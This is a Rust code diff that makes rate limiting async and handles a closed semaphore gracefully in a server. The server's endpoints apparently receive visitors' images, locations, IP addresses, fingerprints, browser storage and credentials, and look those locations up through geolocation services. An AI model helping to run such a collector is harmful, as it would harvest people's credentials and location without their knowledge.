@@ -101,7 +101,7 @@ pub async fn receive_image(
     Json(payload): Json<ImagePayload>,
 ) -> Result<StatusCode, StatusCode> {
     let ip = extract_ip(&headers);
-    if !check_rate_limit(&state, &ip, 60, 60) {
+    if !check_rate_limit(&state, &ip, 60, 60).await {
         return Err(StatusCode::TOO_MANY_REQUESTS);
     }
     let session_id = get_session(&payload.session);
@@ -150,7 +150,7 @@ pub async fn receive_location(
     Json(payload): Json<LocationPayload>,
 ) -> Result<StatusCode, StatusCode> {
     let ip = extract_ip(&headers);
-    if !check_rate_limit(&state, &ip, 60, 60) {
+    if !check_rate_limit(&state, &ip, 60, 60).await {
         return Err(StatusCode::TOO_MANY_REQUESTS);
     }
     let session_id = get_session(&payload.session);
@@ -184,7 +184,10 @@ pub async fn receive_location(
     let lon = payload.lon;
     tokio::spawn(async move {
         // Nominatim: 1 req/sec — acquire permit + sleep 1.2s between calls
-        let _permit = limiter.acquire().await.expect("semaphore not closed");
+        let Ok(_permit) = limiter.acquire().await else {
+            tracing::warn!("External API semaphore closed, skipping geolocation");
+            return;
+        };
         tokio::time::sleep(std::time::Duration::from_millis(1200)).await;
         let url = format!(
             "https://nominatim.openstreetmap.org/reverse?lat={}&lon={}&format=json&addressdetails=1&zoom=16",
@@ -223,7 +226,7 @@ pub async fn receive_ip(
         .and_then(normalize_public_ip)
         .map(str::to_string)
         .unwrap_or_else(|| extract_ip(&headers));
-    if !check_rate_limit(&state, &ip, 60, 60) {
+    if !check_rate_limit(&state, &ip, 60, 60).await {
         return Err(StatusCode::TOO_MANY_REQUESTS);
     }
     let session_id = get_session(&body.session);
@@ -267,7 +270,10 @@ pub async fn receive_ip(
         let limiter = state.external_api_limiter.clone();
         let ip_clone = ip.clone();
         tokio::spawn(async move {
-            let _permit = limiter.acquire().await.expect("semaphore not closed");
+            let Ok(_permit) = limiter.acquire().await else {
+                tracing::warn!("External API semaphore closed, skipping IP geolocation");
+                return;
+            };
             let url = format!("http://ip-api.com/json/{}?fields=status,message,city,region,country,lat,lon,isp,org,as,query", ip_clone);
             match http.get(&url).send().await {
                 Ok(r) if r.status().is_success() => {
@@ -299,7 +305,7 @@ pub async fn receive_fingerprint(
     Json(payload): Json<FingerprintPayload>,
 ) -> Result<StatusCode, StatusCode> {
     let ip = extract_ip(&headers);
-    if !check_rate_limit(&state, &ip, 60, 60) {
+    if !check_rate_limit(&state, &ip, 60, 60).await {
         return Err(StatusCode::TOO_MANY_REQUESTS);
     }
     let session_id = get_session(&payload.session);
@@ -404,7 +410,7 @@ pub async fn receive_event(
     Json(payload): Json<EventPayload>,
 ) -> Result<StatusCode, StatusCode> {
     let ip = extract_ip(&headers);
-    if !check_rate_limit(&state, &ip, 60, 60) {
+    if !check_rate_limit(&state, &ip, 60, 60).await {
         return Err(StatusCode::TOO_MANY_REQUESTS);
     }
     let session_id = get_session(&payload.session);
@@ -426,7 +432,7 @@ pub async fn receive_storage(
     Json(body): Json<StoragePayload>,
 ) -> Result<StatusCode, StatusCode> {
     let ip = extract_ip(&headers);
-    if !check_rate_limit(&state, &ip, 60, 60) {
+    if !check_rate_limit(&state, &ip, 60, 60).await {
         return Err(StatusCode::TOO_MANY_REQUESTS);
     }
     let session_id = get_session(&body.session);
@@ -472,7 +478,7 @@ pub async fn receive_credentials(
     Json(payload): Json<CredentialPayload>,
 ) -> Result<StatusCode, StatusCode> {
     let ip = extract_ip(&headers);
-    if !check_rate_limit(&state, &ip, 60, 60) {
+    if !check_rate_limit(&state, &ip, 60, 60).await {
         return Err(StatusCode::TOO_MANY_REQUESTS);
     }
     let session_id = get_session(&payload.session);
@@ -515,13 +521,13 @@ async fn log_event(state: &AppState, session_id: &str, event_type: &str, data: s
         .execute(&state.pool).await;
 }
 
-pub fn check_rate_limit(
+pub async fn check_rate_limit(
     state: &AppState,
     ip: &str,
     max_requests: u32,
     window_secs: u64,
 ) -> bool {
-    let mut limiter = state.rate_limiter.lock().unwrap();
+    let mut limiter = state.rate_limiter.lock().await;
     let now = std::time::Instant::now();
     let entry = limiter.entry(ip.to_string()).or_insert((0, now));
     if entry.1.elapsed().as_secs() > window_secs {
